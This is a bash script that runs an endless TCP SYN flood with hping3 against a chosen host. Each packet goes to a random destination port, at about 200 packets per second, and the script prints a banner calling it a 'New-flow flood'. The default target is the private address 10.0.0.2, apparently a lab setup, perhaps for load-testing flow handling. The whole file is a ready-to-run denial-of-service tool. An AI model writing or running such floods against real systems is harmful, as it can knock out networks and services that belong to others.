#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-10.0.0.2}"
RATE="${2:-200}"      # packets per second-ish (roughly)
SLEEP="0.005"         # 0.005s ~ 200/s

echo "[+] New-flow flood against ${TARGET} (TCP SYN to random dst ports)"
echo "    Stop with Ctrl+C"

command -v hping3 >/dev/null 2>&1 || {
  echo "[-] hping3 not installed. Install on host: sudo apt install -y hping3"
  exit 1
}

while true; do
  PORT=$(( (RANDOM % 64511) + 1024 ))
  # send 1 SYN packet to random dst port
  hping3 -S -c 1 -p "${PORT}" "${TARGET}" >/dev/null 2>&1 || true
  sleep "${SLEEP}"
done
